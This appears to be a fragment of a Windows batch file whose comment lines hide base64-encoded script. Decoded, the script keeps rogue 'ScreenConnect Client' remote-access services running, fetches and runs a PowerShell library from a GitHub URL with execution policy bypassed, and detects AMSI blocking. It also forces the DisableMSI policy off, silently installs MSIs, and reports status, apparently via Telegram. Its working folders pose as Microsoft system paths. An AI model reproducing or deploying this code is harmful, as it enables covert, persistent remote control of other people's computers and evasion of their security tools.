::cFwudXBkIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCg0KcmVtIGFs
::aXZlID0gUlVOTklORyBvciBTVEFSVF9QRU5ESU5HIChjb25uZWN0IHJhY2UpIOKA
::lCBkbyBub3QgcmVpbnN0YWxsDQpzYyBxdWVyeSAiJUdTVkMlIiB8IGZpbmRzdHIg
::L0kgL0M6IlJVTk5JTkciIC9DOiJTVEFSVF9QRU5ESU5HIiAvQzoiQ09OVElOVUVf
::UEVORElORyIgPm51bA0KaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogIHNldCAiR1JZ
::WEFfT0s9MSINCiAgZWNobyBncnl4YV9tdXN0X2FscmVhZHlfYWxpdmU+PiIlTE9H
::JSINCiAgZXhpdCAvYiAwDQopDQoNCnJlbSBzZXJ2aWNlIGV4aXN0cyBidXQgc3Rv
::cHBlZCDihpIgc3RhcnQgb25seQ0Kc2MgcXVlcnkgIiVHU1ZDJSIgPm51bCAyPiYx
::DQppZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgZWNobyBncnl4YV9tdXN0X3N0YXJ0
::X29ubHk+PiIlTE9HJSINCiAgc2MgY29uZmlnICIlR1NWQyUiIHN0YXJ0PSBhdXRv
::ID5udWwgMj4mMQ0KICBzYyBzdGFydCAiJUdTVkMlIiA+bnVsIDI+JjENCiAgdGlt
::ZW91dCAvdCA4IC9ub2JyZWFrID5udWwNCiAgc2MgcXVlcnkgIiVHU1ZDJSIgfCBm
::aW5kc3RyIC9JIC9DOiJSVU5OSU5HIiAvQzoiU1RBUlRfUEVORElORyIgPm51bA0K
::ICBpZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgICBzZXQgIkdSWVhBX09LPTEiDQog
::ICAgZWNobyBncnl4YV9tdXN0X3N0YXJ0ZWRfb2s+PiIlTE9HJSINCiAgICBleGl0
::IC9iIDANCiAgKQ0KKQ0KDQpyZW0gcmUtZmV0Y2ggbGliIGludG8gVEVNUCBpZiBX
::RCBjb3B5IG1pc3NpbmcgKEFNU0kvcXVhcmFudGluZSB3aXBlKQ0KaWYgbm90IGV4
::aXN0ICIlV0QlXG93bl9saWIucHMxIiAoDQogIGVjaG8gZ3J5eGFfbXVzdF9saWJf
::bWlzc2luZ19yZWZldGNoPj4iJUxPRyUiDQogICIlQ1VSTCUiIC1MIC0tc3NsLW5v
::LXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCAxMCAtLW1heC10aW1lIDQwIC1vICIl
::U3lzdGVtUm9vdCVcVGVtcFwudXBkXG93bl9saWIucHMxIiAiaHR0cHM6Ly9yYXcu
::Z2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9wL21haW4v
::b3duX2xpYi5wczEiID5udWwgMj4mMQ0KICBpZiBleGlzdCAiJVN5c3RlbVJvb3Ql
::XFRlbXBcLnVwZFxvd25fbGliLnBzMSIgY29weSAveSAiJVN5c3RlbVJvb3QlXFRl
::bXBcLnVwZFxvd25fbGliLnBzMSIgIiVXRCVcb3duX2xpYi5wczEiID5udWwgMj4m
::MQ0KKQ0KDQpzZXQgIkxJQj0lV0QlXG93bl9saWIucHMxIg0KaWYgbm90IGV4aXN0
::ICIlTElCJSIgaWYgZXhpc3QgIiVTeXN0ZW1Sb290JVxUZW1wXC51cGRcb3duX2xp
::Yi5wczEiIHNldCAiTElCPSVTeXN0ZW1Sb290JVxUZW1wXC51cGRcb3duX2xpYi5w
::czEiDQoNCmlmIGV4aXN0ICIlTElCJSIgKA0KICBzZXQgIkdSRVM9Ig0KICBmb3Ig
::L2YgInVzZWJhY2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJv
::ZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZp
::bGUgIiVMSUIlIiAtQWN0aW9uIGdyeXhhLWVuc3VyZSAtTm9XYWl0IC1Xb3JrRGly
::ICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUgMl4+bnVsYCkgZG8gc2V0ICJHUkVTPSUl
::UiINCiAgZWNobyBncnl4YV9tdXN0X2xpYj0hR1JFUyE+PiIlTE9HJSINCiAgZWNo
::byAhR1JFUyF8IGZpbmRzdHIgL0kgIm1hbGljaW91cyBTY3JpcHRDb250YWluZWRN
::YWxpY2lvdXNDb250ZW50IiA+bnVsDQogIGlmIG5vdCBlcnJvcmxldmVsIDEgKA0K
::ICAgIGVjaG8gZ3J5eGFfbXVzdF9hbXNpX2Jsb2NrZWQ+PiIlTE9HJSINCiAgICBz
::ZXQgIkdSRVM9Ig0KICApDQogIGVjaG8gIUdSRVMhfCBmaW5kc3RyIC9JIC9CIC9D
::OiJIRUFMVEhZIiAvQzoiUVVFVUVEIiAvQzoiSU5GTElHSFQiID5udWwNCiAgaWYg
::bm90IGVycm9ybGV2ZWwgMSB0aW1lb3V0IC90IDE1IC9ub2JyZWFrID5udWwNCikN
::Cg0Kc2MgcXVlcnkgIiVHU1ZDJSIgfCBmaW5kc3RyIC9JIC9DOiJSVU5OSU5HIiAv
::QzoiU1RBUlRfUEVORElORyIgPm51bA0KaWYgbm90IGVycm9ybGV2ZWwgMSBzZXQg
::IkdSWVhBX09LPTEiDQoNCmlmICIlR1JZWEFfT0slIj09IjAiICgNCiAgZWNobyBn
::cnl4YV9tdXN0X2NtZF9mYWxsYmFjaz4+IiVMT0clIg0KICBpZiBub3QgZXhpc3Qg
::IiVXRCVcb3duX2dyeXhhLmNtZCIgKA0KICAgICIlQ1VSTCUiIC1MIC0tc3NsLW5v
::LXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCAxMCAtLW1heC10aW1lIDIwIC1vICIl
::V0QlXG93bl9ncnl4YS5jbWQiICIlT1dOR1JZWEElIiA+bnVsIDI+JjENCiAgICBp
::ZiBub3QgZXhpc3QgIiVXRCVcb3duX2dyeXhhLmNtZCIgIiVDVVJMJSIgLUwgLS1j
::b25uZWN0LXRpbWVvdXQgMTAgLS1tYXgtdGltZSAyMCAtbyAiJVdEJVxvd25fZ3J5
::eGEuY21kIiAiJU9XTkdSWVhBMiUiID5udWwgMj4mMQ0KICApDQogIGlmIGV4aXN0
::ICIlV0QlXG93bl9ncnl4YS5jbWQiICgNCiAgICByZW0gZGV0YWNoZWQgc28gbW9u
::IHRpY2sgaXMgbm90IGJsb2NrZWQgYnkgbXNpZXhlYw0KICAgIHN0YXJ0ICIiIC9i
::IGNtZCAvYyAiY2FsbCBcIiVXRCVcb3duX2dyeXhhLmNtZFwiIFwiJVdEJVwiIFwi
::JUdSWVhBX0ZQJVwiIFwiJUtFRVBfRlAlXCIgXCIlQUxUX0ZQJVwiID4+XCIlTE9H
::JVwiIDI+JjEiDQogICAgZWNobyBncnl4YV9tdXN0X2NtZF9zcGF3bmVkPj4iJUxP
::RyUiDQogICAgdGltZW91dCAvdCAyNSAvbm9icmVhayA+bnVsDQogICkgZWxzZSAo
::DQogICAgZWNobyBncnl4YV9tdXN0X2NtZF9taXNzaW5nPj4iJUxPRyUiDQogICkN
::CikNCg0Kc2MgcXVlcnkgIiVHU1ZDJSIgfCBmaW5kc3RyIC9JIC9DOiJSVU5OSU5H
::IiAvQzoiU1RBUlRfUEVORElORyIgPm51bA0KaWYgbm90IGVycm9ybGV2ZWwgMSBz
::ZXQgIkdSWVhBX09LPTEiDQppZiAiJUdSWVhBX09LJSI9PSIxIiAoZWNobyBncnl4
::YV9tdXN0X3J1bm5pbmdfb2s+PiIlTE9HJSIpIGVsc2UgKGVjaG8gZ3J5eGFfbXVz
::dF9zdGlsbF9kb3duPj4iJUxPRyUiKQ0KZXhpdCAvYiAwDQoNCjpUZ0dyeXhhDQpy
::ZW0gJTE9a2luZCAlMj1tc2cg4oCUIHBlci1Hcnl4YSBzdGF0ZSBzbyBpdCBjYW5u
::b3QgcmV1c2UgUHJpbWFyeSBvd25fbW9uLnN0YXRlLg0Kc2V0ICJHU1RBVEU9JX4x
::Ig0Kc2V0ICJHTVNHPSV+MiINCnNldCAiR1NUQVRFRklMRT0lV0QlXG93bl9tb25f
::Z3J5eGEuc3RhdGUiDQpzZXQgIkdPTEQ9Ig0KaWYgZXhpc3QgIiVHU1RBVEVGSUxF
::JSIgc2V0IC9wIEdPTEQ9PCIlR1NUQVRFRklMRSUiDQppZiAvSSAiJUdTVEFURSUi
::PT0iUkVTVE9SRUQiICgNCiAgaWYgL0kgIiVHT0xEJSI9PSJSRVNUT1JFRCIgZXhp
::dCAvYiAwDQogIGlmIGV4aXN0ICIlV0QlXHRnX2dyeXhhLmZsYWciICgNCiAgICBw
::b3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1Db21tYW5kICJp
::ZigoTmV3LVRpbWVTcGFuIC1TdGFydCAoR2V0LUl0ZW0gLUxpdGVyYWxQYXRoICcl
::V0QlXHRnX2dyeXhhLmZsYWcnKS5MYXN0V3JpdGVUaW1lKS5Ub3RhbE1pbnV0ZXMg
::LWx0IDE0NDApe2V4aXQgMH1lbHNle2V4aXQgMX0iID5udWwgMj4mMQ0KICAgIGlm
::IG5vdCBlcnJvcmxldmVsIDEgKA0KICAgICAgZWNobyB0Z19ncnl4YV9zdXBwcmVz
::c18lR1NUQVRFJT4+IiVMT0clIg0KICAgICAgZXhpdCAvYiAwDQogICAgKQ0KICAp
::DQogIGVjaG8gJUdTVEFURSU+IiVHU1RBVEVGSUxFJSINCiAgZWNobyBzZW50PiIl
::V0QlXHRnX2dyeXhhLmZsYWciDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9u
::SW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVc
::dGdfcmVwb3J0LnBzMSIgLVN0YXRlICVHU1RBVEUlIC1TdW1tYXJ5ICIlR01TRyUi
::IC1CdWlsZCAlTU9OVkVSJSAtQ291bnQgJUNPVU5UJSA+bnVsIDI+JjENCiAgZWNo
::byB0ZyBncnl4YSAlR1NUQVRFJSBzZW50Pj4iJUxPRyUiDQogIGV4aXQgL2IgMA0K
::KQ0KaWYgL0kgIiVHU1RBVEUlIj09IkRPV04iIGlmIC9JICIlR09MRCUiPT0iRE9X
::TiIgaWYgZXhpc3QgIiVXRCVcdGdfZ3J5eGEuZmxhZyIgKA0KICBwb3dlcnNoZWxs
::IC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1Db21tYW5kICJpZigoTmV3LVRp
::bWVTcGFuIC1TdGFydCAoR2V0LUl0ZW0gLUxpdGVyYWxQYXRoICclV0QlXHRnX2dy
::eXhhLmZsYWcnKS5MYXN0V3JpdGVUaW1lKS5Ub3RhbE1pbnV0ZXMgLWx0IDM2MCl7
::ZXhpdCAwfWVsc2V7ZXhpdCAxfSIgPm51bCAyPiYxDQogIGlmIG5vdCBlcnJvcmxl
::dmVsIDEgKA0KICAgIGVjaG8gdGdfZ3J5eGFfc3VwcHJlc3NfJUdTVEFURSU+PiIl
::TE9HJSINCiAgICBleGl0IC9iIDANCiAgKQ0KKQ0KZWNobyAlR1NUQVRFJT4iJUdT
::VEFURUZJTEUlIg0KZWNobyBzZW50PiIlV0QlXHRnX2dyeXhhLmZsYWciDQpwb3dl
::cnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xp
::Y3kgQnlwYXNzIC1GaWxlICIlV0QlXHRnX3JlcG9ydC5wczEiIC1TdGF0ZSAlR1NU
::QVRFJSAtU3VtbWFyeSAiJUdNU0clIiAtQnVpbGQgJU1PTlZFUiUgLUNvdW50ICVD
::T1VOVCUgPm51bCAyPiYxDQplY2hvIHRnIGdyeXhhICVHU1RBVEUlIHNlbnQ+PiIl
::TE9HJSINCmV4aXQgL2IgMA0KDQo6SW5zdGFsbE1zaQ0KcmVtICUxPXVybCAlMj10
::YWcNCnNldCAiVVJMPSV+MSINCnNldCAiVEFHPSV+MiINCmVjaG8gWyVUQUclXSBm
::ZXRjaCAlVVJMJT4+IiVMT0clIg0KIiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2b2tl
::IC0tY29ubmVjdC10aW1lb3V0IDI1IC0tbWF4LXRpbWUgMzAwIC1vICIlTVNJJS50
::bXAiICIlVVJMJSIgPj4iJUxPRyUiIDI+JjENCmZvciAlJUYgaW4gKCIlTVNJJS50
::bXAiKSBkbyBpZiAlJX56RiBMRVEgMTAwMDAwMCAoDQogIGVjaG8gWyVUQUclXSBm
::ZXRjaCBmYWlsZWQ+PiIlTE9HJSINCiAgZGVsIC9mIC9xICIlTVNJJS50bXAiID5u
::dWwgMj4mMQ0KICBleGl0IC9iIDENCikNCm1vdmUgL3kgIiVNU0klLnRtcCIgIiVN
::U0klIiA+bnVsIDI+JjENCnJlbSBNNDE6IE9MRSBtYWdpYyArIFByb2R1Y3ROYW1l
::IEZQIG11c3QgbWF0Y2ggS0VFUF9GUCBiZWZvcmUgL2kNCnNldCAiTVNJT0s9bm8i
::DQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgZm9yIC9mICJ1c2ViYWNrcSBk
::ZWxpbXM9IiAlJVIgaW4gKGBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVy
::YWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9s
::aWIucHMxIiAtQWN0aW9uIHRlc3QtbXNpIC1GcCAiJUtFRVBfRlAlIiAtRXh0cmEg
::IiVNU0klIiAtV29ya0RpciAiJVdEJSJgKSBkbyBzZXQgIk1TSU9LPSUlUiINCmlm
::IC9JIG5vdCAiIU1TSU9LISI9PSJ5ZXMiICgNCiAgZWNobyBbJVRBRyVdIG1zaV92
::YWxpZGF0ZV9mYWlsPj4iJUxPRyUiDQogIGRlbCAvZiAvcSAiJU1TSSUiID5udWwg
::Mj4mMQ0KICBleGl0IC9iIDENCikNCnJlbSBNNDIvTTQ3OiBzaWJsaW5nLXNhZmUg
::Y29weSAoZW1wdHkgVXBncmFkZSB0YWJsZSkgYmVmb3JlIHNldnJ6IC9pIOKAlCBy
::ZWZ1c2UgL2kgaWYgcHJvdGVjdCBmYWlscw0Kc2V0ICJNU0lfU0FGRT0iDQppZiBl
::eGlzdCAiJVdEJVxvd25fbGliLnBzMSIgZm9yIC9mICJ1c2ViYWNrcSBkZWxpbXM9
::IiAlJVMgaW4gKGBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZl
::IC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMx
::IiAtQWN0aW9uIHByb3RlY3QtbXNpIC1FeHRyYSAiJU1TSSUiIC1Xb3JrRGlyICIl
::V0QlImApIGRvIGlmIG5vdCAiJSVTIj09IkZBSUwiIGlmIGV4aXN0ICIlJVMiIHNl
::dCAiTVNJX1NBRkU9JSVTIg0KaWYgbm90IGRlZmluZWQgTVNJX1NBRkUgKA0KICBl
::Y2hvIFslVEFHJV0gbXNpX3Byb3RlY3RfZmFpbF9za2lwX2k+PiIlTE9HJSINCiAg
::ZGVsIC9mIC9xICIlTVNJJSIgPm51bCAyPiYxDQogIGV4aXQgL2IgMQ0KKQ0KY2Fs
::bCA6Tm9Nc2lQb2xpY3kNCnJlbSBNMTMvTTQxOiBzdGFsZSBwcmltYXJ5IGRpciB1
::bmRlciBQRiBhbmQgUEY4Ng0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50
::ICglS0VFUF9GUCUpIiA+bnVsIDI+JjENCmlmIGVycm9ybGV2ZWwgMSAoDQogIGlm
::IGV4aXN0ICIlUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSki
::ICgNCiAgICBlY2hvIHN0YWxlX3ByaW1hcnlfZGlyX2NsZWFuX3BmODY+PiIlTE9H
::JSINCiAgICBybWRpciAvcyAvcSAiJVBGODYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50
::ICglS0VFUF9GUCUpIiA+bnVsIDI+JjENCiAgKQ0KICBpZiBleGlzdCAiJVByb2dy
::YW1GaWxlcyVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiICgNCiAg
::ICBlY2hvIHN0YWxlX3ByaW1hcnlfZGlyX2NsZWFuX3BmPj4iJUxPRyUiDQogICAg
::cm1kaXIgL3MgL3EgIiVQcm9ncmFtRmlsZXMlXFNjcmVlbkNvbm5lY3QgQ2xpZW50
::ICglS0VFUF9GUCUpIiA+bnVsIDI+JjENCiAgKQ0KKQ0KZWNobyBbJVRBRyVdIG1z
::aWV4ZWMgaW5zdGFsbD4+IiVMT0clIg0KbXNpZXhlYyAvaSAiJU1TSV9TQUZFJSIg
::L3FuIC9ub3Jlc3RhcnQgQUxMVVNFUlM9MSBSRUJPT1Q9UmVhbGx5U3VwcHJlc3Mg
::L0wqdiAiJVdEJVxtc2lfaGVhbC5sb2ciID5udWwgMj4mMQ0Kc2V0ICJNU0lFWElU
::PSFFUlJPUkxFVkVMISINCmVjaG8gWyVUQUclXSBtc2lleGVjIGV4aXQ9IU1TSUVY
::SVQhPj4iJUxPRyUiDQppZiAiIU1TSUVYSVQhIj09IjE2MTgiICgNCiAgZWNobyBb
::JVRBRyVdIG1zaV9idXN5X3JldHJ5Pj4iJUxPRyUiDQogIHRpbWVvdXQgL3QgMzAg
::L25vYnJlYWsgPm51bA0KICBtc2lleGVjIC9pICIlTVNJX1NBRkUlIiAvcW4gL25v
::cmVzdGFydCBBTExVU0VSUz0xIFJFQk9PVD1SZWFsbHlTdXBwcmVzcyAvTCp2ICIl
::V0QlXG1zaV9oZWFsMi5sb2ciID5udWwgMj4mMQ0KICBzZXQgIk1TSUVYSVQ9IUVS
::Uk9STEVWRUwhIg0KICBlY2hvIFslVEFHJV0gbXNpZXhlY19yZXRyeSBleGl0PSFN
::U0lFWElUIT4+IiVMT0clIg0KKQ0KaWYgL0kgbm90ICIlTVNJX1NBRkUlIj09IiVN
::U0klIiBkZWwgL2YgL3EgIiVNU0lfU0FGRSUiID5udWwgMj4mMQ0KY2FsbCA6V2Fp
::dFN2Yw0KY2FsbCA6UmVzdG9yZUFsdA0KcmVtIE8zNzogc2V2cnogL2kgc2hhcmVz
::IGxlZ2FjeSBVcGdyYWRlQ29kZXMgd2l0aCBncnl4YSDigJQgYWx3YXlzIHJlLWVu
::c3VyZSBHcnl4YSBhZnRlcg0KY2FsbCA6RW5zdXJlR3J5eGFNdXN0DQpleGl0IC9i
::IDANCg0KOlJlcGFpclJlZ2lzdGVyZWQNCnJlbSAlMT1maW5nZXJwcmludCAtIHNl
::cnZpY2UgZGVsZXRlZCBidXQgcHJvZHVjdCByZWdpc3RlcmVkOiByZXBhaXIgYnkg
::R1VJRC4NCnJlbSBNNDA6IGxhYmVsIHdhcyBhbXB1dGF0ZWQgKGJvZHkgc2F0IGFm
::dGVyIEluc3RhbGxNc2kgZXhpdCAvYikgc28gcHJpbWFyeSBoZWFsIG5ldmVyIHJh
::bi4NCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJX4xKSIgPm51bCAy
::PiYxDQppZiBub3QgZXJyb3JsZXZlbCAxIGV4aXQgL2IgMA0KaWYgbm90IGV4aXN0
::ICIlV0QlXG93bl9saWIucHMxIiBleGl0IC9iIDENCnBvd2Vyc2hlbGwgLU5vUHJv
::ZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZp
::bGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVwYWlyIC1GcCAiJX4xIiAt
::V29ya0RpciAiJVdEJSIgPj4iJUxPRyUiIDI+JjENCmNhbGwgOldhaXRTdmMNCmV4
::aXQgL2IgMA0KDQo6UmVzdG9yZUFsdA0KcmVtIEFMVCBzZXJ2aWNlIGdvbmUgYnV0
::IHN0aWxsIHJlZ2lzdGVyZWQgKFNDLWZhbWlseSBtc2lleGVjIHNpZGUgZWZmZWN0
::KSAtIHJlcGFpciBpdCB0b28uDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGll
::bnQgKCVBTFRfRlAlKSIgPm51bCAyPiYxDQppZiBub3QgZXJyb3JsZXZlbCAxIGV4
::aXQgL2IgMA0KZWNobyBhbHQgbWlzc2luZyAtIHJlcGFpciBhdHRlbXB0Pj4iJUxP
::RyUiDQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAtTm9Q
::cm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAt
::RmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZXBhaXIgLUZwICIlQUxU
::X0ZQJSIgLVdvcmtEaXIgIiVXRCUiID4+IiVMT0clIiAyPiYxDQpzYyBxdWVyeSAi
::U2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgfCBmaW5kICJSVU5OSU5H
::IiA+bnVsDQppZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiQUxUX09LPTEiDQpleGl0
::IC9iIDANCg0KOk5vTXNpUG9saWN5DQpyZWcgZGVsZXRlICJIS0xNXFNPRlRXQVJF
::XFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgRGlzYWJs
::ZU1TSSAvZiA+bnVsIDI+JjENCnJlZyBkZWxldGUgIkhLQ1VcU09GVFdBUkVcUG9s
::aWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAvdiBEaXNhYmxlTVNJ
::IC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xN
::aWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIiIC92IERpc2FibGVNU0kgL3QgUkVH
::X0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpleGl0IC9iIDANCg0KOldhaXRTdmMN
::CnNldCAiVFJJRVM9MCINCjpXYWl0TG9vcA0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5l
::Y3QgQ2xpZW50ICglS0VFUF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwNCmlm
::IG5vdCBlcnJvcmxldmVsIDEgKA0KICBzZXQgIklOU1RBTExFRD0xIg0KICBzZXQg
::IlBSSU1fT0s9MSINCiAgZXhpdCAvYiAwDQopDQpzZXQgL2EgVFJJRVMrPTENCmlm
::ICVUUklFUyUgR0VRIDEwIGV4aXQgL2IgMQ0KcGluZyAxMjcuMC4wLjEgLW4gNyA+
::bnVsIDI+JjENCmdvdG8gOldhaXRMb29wDQoNCjpUZ1N0YXRlDQpzZXQgIk5FV1NU
::QVRFPSV+MSINCnNldCAiTVNHPSV+MiINCnNldCAiT0xEU1RBVEU9Ig0KaWYgZXhp
::c3QgIiVTVEFURSUiIHNldCAvcCBPTERTVEFURT08IiVTVEFURSUiDQpyZW0gZmFs
::c2UgRE9XTiBhZnRlciByZWJvb3QgcmFjZTogcHJpbWFyeSBhbHJlYWR5IFJ1bm5p
::bmcg4oCUIGRvIG5vdCBzcGFtDQppZiAvSSAiJU5FV1NUQVRFJSI9PSJET1dOIiAo
::DQogIHNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIg
::fCBmaW5kICJSVU5OSU5HIiA+bnVsDQogIGlmIG5vdCBlcnJvcmxldmVsIDEgKA0K
::ICAgIGVjaG8gdGdfc2tpcF9kb3duX2FscmVhZHlfcnVubmluZz4+IiVMT0clIg0K
::ICAgIGV4aXQgL2IgMA0KICApDQopDQpyZW0gcmF0ZS1saW1pdCByZXBlYXRlZCBE
::T1dOL0ZBSUw6IG1heCAxIGFsZXJ0IHBlciA2aCB3aGlsZSBzdHVjaw0KaWYgL0kg
::IiVORVdTVEFURSUiPT0iRE9XTiIgZ290byA6TWF5YmVTdXBwcmVzcw0KaWYgL0kg
::IiVORVdTVEFURSUiPT0iRkFJTCIgZ290byA6TWF5YmVTdXBwcmVzcw0KZ290byA6
::U2VuZEFsZXJ0DQo6TWF5YmVTdXBwcmVzcw0KaWYgL0kgIiVORVdTVEFURSUiPT0i
::JU9MRFNUQVRFJSIgaWYgZXhpc3QgIiVXRCVcdGdfc2VudC5mbGFnIiAoDQogIHBv
::d2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUNvbW1hbmQgImlm
::KChOZXctVGltZVNwYW4gLVN0YXJ0IChHZXQtSXRlbSAtTGl0ZXJhbFBhdGggJyVX
::RCVcdGdfc2VudC5mbGFnJykuTGFzdFdyaXRlVGltZSkuVG90YWxNaW51dGVzIC1s
::dCAzNjApe2V4aXQgMH1lbHNle2V4aXQgMX0iID5udWwgMj4mMQ0KICBpZiBub3Qg
::ZXJyb3JsZXZlbCAxICgNCiAgICBlY2hvIHRnX3N1cHByZXNzZWRfJU5FV1NUQVRF
::JT4+IiVMT0clIg0KICAgIGV4aXQgL2IgMA0KICApDQopDQo6U2VuZEFsZXJ0DQpl
::Y2hvICVORVdTVEFURSU+IiVTVEFURSUiDQplY2hvIHNlbnQ+IiVXRCVcdGdfc2Vu
::dC5mbGFnIg0KcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAt
::RXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVx0Z19yZXBvcnQucHMx
::IiAtU3RhdGUgJU5FV1NUQVRFJSAtU3VtbWFyeSAiJU1TRyUiIC1CdWlsZCAlTU9O
::VkVSJSAtQ291bnQgJUNPVU5UJSA+bnVsIDI+JjENCmVjaG8gdGcgc3RhdGUgJU5F
::V1NUQVRFJSBzZW50Pj4iJUxPRyUiDQpleGl0IC9iIDANCg==
::B64_MON_END
::B64_SEC_BEGIN
::QGVjaG8gb2ZmDQpSRU0gT1dOX1NFQ1VSRSBCVUlMRCAyMDI2MDgwNFMxMyAtIHNl
::dnJ6LmNmZyArIGdyeXhhLmNmZyBkeW5hbWljIEZQczsgU1kgREVMRVRFK1dSSVRF
::X0RBQw0Kc2V0bG9jYWwgRW5hYmxlRXh0ZW5zaW9ucyBFbmFibGVEZWxheWVkRXhw
::YW5zaW9uDQpzZXQgIldEPSVQcm9ncmFtRGF0YSVcTWljcm9zb2Z0XFdpbmRvd3Nc
::V0VSXFRlbXBcLnd1Y2FjaGUiDQpzZXQgIldEMj0lUHJvZ3JhbURhdGElXE1pY3Jv
::c29mdFxEaWFnbm9zaXNcU3RhdGVcLmV0bGNhY2hlIg0Kc2V0ICJMT0c9JVdEJVxi
::b290LmVyciINCnNldCAiS0VFUDE9NWY2MDEwNTc5ODUyZTUwNyINCnNldCAiS0VF
::UDI9Zjg2MWM4MTQwZDQ1MzQyNyINCnNldCAiS0VFUDM9MzZlNTA2ZmYwMTZiMjE1
::MSINCmlmIGV4aXN0ICIlV0QlXHNldnJ6LmNmZyIgZm9yIC9mICJ1c2ViYWNrcSB0
::b2tlbnM9MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXHNldnJ6LmNmZyIpIGRv
::ICgNCiAgaWYgL0kgIiUlSyI9PSJQUklNQVJZX0ZQIiBzZXQgIktFRVAxPSUlTCIN
::CiAgaWYgL0kgIiUlSyI9PSJBTFRfRlAiIHNldCAiS0VFUDI9JSVMIg0KKQ0KaWYg
::ZXhpc3QgIiVXRCVcZ3J5eGEuY2ZnIiBmb3IgL2YgInVzZWJhY2txIHRva2Vucz0x
::LCogZGVsaW1zPT0iICUlSyBpbiAoIiVXRCVcZ3J5eGEuY2ZnIikgZG8gaWYgL0kg
::IiUlSyI9PSJDVVJSRU5UX0ZQIiBzZXQgIktFRVAzPSUlTCINCnNldCAiUFJJTT1T
::Y3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAxJSkiDQpzZXQgIkFMVD1TY3JlZW5D
::b25uZWN0IENsaWVudCAoJUtFRVAyJSkiDQpzZXQgIkdSWVhBPVNjcmVlbkNvbm5l
::Y3QgQ2xpZW50ICglS0VFUDMlKSINCnNldCAiUEY9JVByb2dyYW1GaWxlcyUiDQpz
::ZXQgIlBGODY9JVByb2dyYW1GaWxlcyh4ODYpJSINCnNldCAiVEFTS1JPT1Q9JVN5
::c3RlbVJvb3QlXFN5c3RlbTMyXFRhc2tzIg0KDQppZiBub3QgZXhpc3QgIiVXRCUi
::IG1rZGlyICIlV0QlIiA+bnVsIDI+JjENCmlmIG5vdCBleGlzdCAiJVdEMiUiIG1r
::ZGlyICIlV0QyJSIgPm51bCAyPiYxDQplY2hvIHNlY3VyZV9iZWdpbiAlREFURSUg
::JVRJTUUlIFMxMz4+IiVMT0clIg0KDQpSRU0gLS0tIE5ldXRyYWxpemUgTVNJIGJs
::b2NrIHBvbGljaWVzICgxNjI1KSAtLS0NClJFTSBEaXNhYmxlTVNJOiAwPWFsbG93
::LCAxPW5vbi1hZG1pbiBvbmx5LCAyPWFsbCAtPiBmb3JjZSAwDQpyZWcgYWRkICJI
::S0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxl
::ciIgL3YgRGlzYWJsZU1TSSAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjEN
::CnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRv
